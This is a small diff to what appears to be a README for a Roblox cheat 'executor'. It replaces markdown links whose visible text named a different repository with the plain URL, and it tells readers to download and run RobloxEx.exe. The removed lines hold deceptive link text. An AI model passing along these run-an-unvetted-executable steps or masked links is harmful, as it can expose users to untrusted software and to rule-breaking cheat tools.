@@ -42,8 +42,8 @@ First open Roblox
 **Download**
 
 ```
-- git clone [https://github.com/Tailschrantz/RobloxExecutor.git](https://github.com/1Kenjii/RobloxEx.git)
-- or download [zip https://github.com/Tailschrantz/RobloxExecutor.git](https://github.com/1Kenjii/RobloxEx.git)
+- git clone https://github.com/1Kenjii/RobloxEx.git
+- or download zip https://github.com/1Kenjii/RobloxEx.git
 - extract file
 - run RobloxEx.exe
 - go into script
